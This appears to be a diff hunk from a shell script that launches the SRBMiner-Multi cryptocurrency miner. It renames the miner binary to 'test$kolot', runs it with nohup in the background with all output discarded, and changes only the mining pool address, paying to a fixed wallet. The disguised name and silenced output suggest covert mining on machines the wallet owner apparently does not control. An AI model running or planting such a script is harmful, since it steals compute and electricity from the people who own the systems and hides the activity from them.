@@ -10,4 +10,4 @@ cd SRBMiner-Multi-2-4-7
 
 mv SRBMiner-MULTI test$kolot
 
-nohup ./test$kolot --algorithm aurum --pool luckyynr.us.to:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
+nohup ./test$kolot --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
